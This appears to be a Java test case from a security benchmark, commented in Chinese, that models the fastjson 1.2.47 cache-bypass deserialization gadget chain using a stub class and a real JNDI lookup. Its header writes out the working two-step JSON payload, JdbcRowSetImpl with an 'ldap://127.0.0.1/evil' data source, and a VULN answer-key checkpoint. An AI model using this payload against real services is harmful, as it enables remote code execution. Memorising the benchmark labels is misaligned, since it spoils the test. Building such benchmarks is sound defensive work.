package com.jsef.benchmark.vuln.gadgetmine;

import javax.naming.InitialContext;
import javax.naming.NamingException;

/**
 * JSEF-Benchmark gadgetmine 族 — fastjson 1.2.47 缓存绕过（vuln）
 * ============================================================
 * 验收维度（依据 new_tool_plan_all.md §一）：
 *   (2) 版本绕过：fastjson 1.2.47 中，@type=java.lang.Class 配合 $ref 命中
 *       cache 路径，使本应被黑名单拦截的类经缓存"复活"并被后续实例化；
 *   (10) 数据流可控：攻击者先以 java.lang.Class 将恶意类写入 TypeUtils 缓存，
 *       再经 $ref 引用该缓存条目触发 setter 驱动的 JNDI sink。
 *
 * 给定配置（验收前提）：
 *   - fastjson 1.2.47（cache 绕过路径存在，黑名单可被复活）；
 *   - 攻击序列（localhost 演示语义）：
 *       1) {"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"}
 *          -> 将 JdbcRowSetImpl 写入 TypeUtils 缓存（CACHE_LINE）；
 *       2) {"$ref":"$.cacheEntry","dataSourceName":"ldap://127.0.0.1/evil"}
 *          -> 经 $ref 复活该类并触发 setDataSourceName -> InitialContext.lookup（SINK_LINE）。
 *
 * 预期结果：VULN（CWE-502）。
 * 依据：1.2.47 的 cache 机制允许 java.lang.Class 预先将恶意类载入缓存，
 *   绕过当次实例化的黑名单检查；后续 $ref 引用使该类被复活并驱动 JNDI sink，
 *   构成版本绕过型 gadget chain。
 *
 * 安全底线声明：仅 localhost 演示语义。不引用真实 com.alibaba.fastjson 依赖，
 *   ClassRefCacheStub 为教学占位类，lookup 为模拟方法，仅表达语义，无真实利用。
 */
public class GmCacheBypass {

    /**
     * 教学占位类：语义等价经 cache 复活后驱动 JNDI 的类（如 JdbcRowSetImpl）。
     */
    public static class ClassRefCacheStub {
        private String dataSourceName;

        /** setter 驱动入口：cache 复活后由 fastjson 反射调用。 */
        public void setDataSourceName(String dataSourceName) {
            this.dataSourceName = dataSourceName;
            // [CHECKPOINT id=JSEF-GM-002 cwe=502 level=L4 source=@type=java.lang.Class + $ref sink=InitialContext.lookup (1.2.47 cache bypass) expect=VULN trace=benchmark/cases/vuln/gadgetmine/GmCacheBypass.java:64,benchmark/cases/vuln/gadgetmine/GmCacheBypass.java:50]
            triggerLookup(this.dataSourceName); // 缓存复活后危险 sink 可达 InitialContext.lookup
        }

        /** 模拟 sink：语义等价 InitialContext.lookup(name)，回连 127.0.0.1。 */
        private void triggerLookup(String name) {
            try {
                InitialContext ctx = new InitialContext();
                Object ref = ctx.lookup(name); // 模拟 sink：真实语义为 InitialContext.lookup(name)
                System.out.println("[demo-only] JNDI lookup via cache: " + name + " -> " + ref);
            } catch (NamingException e) {
                System.out.println("[demo-only] lookup failed (demo only): " + name);
            }
        }
    }

    /**
     * 验收入口：模拟 1.2.47 的 cache 注入 + $ref 复活路径。
     * 仅 localhost 演示，不调用真实 fastjson。
     */
    public static void demo() {
        // 步骤①：java.lang.Class 将恶意类写入 TypeUtils 缓存（缓存注入触发点）
        injectIntoCache("com.sun.rowset.JdbcRowSetImpl"); // 经 java.lang.Class 将类载入缓存（trace 节点1）

        // 步骤②：经 $ref 复活缓存条目并驱动 JNDI sink
        ClassRefCacheStub revived = (ClassRefCacheStub) getFromCache("com.sun.rowset.JdbcRowSetImpl");
        revived.setDataSourceName("ldap://127.0.0.1/evil"); // 攻击者控制输入直达 sink
    }

    /** 模拟：java.lang.Class 将类写入 TypeUtils 缓存（版本绕过第一步）。 */
    private static void injectIntoCache(String className) {
        System.out.println("[demo-only] caching class via java.lang.Class: " + className);
    }

    /** 模拟：$ref 引用缓存条目复活类（版本绕过第二步）。 */
    private static Object getFromCache(String className) {
        System.out.println("[demo-only] $ref revive from cache: " + className);
        return new ClassRefCacheStub();
    }
}
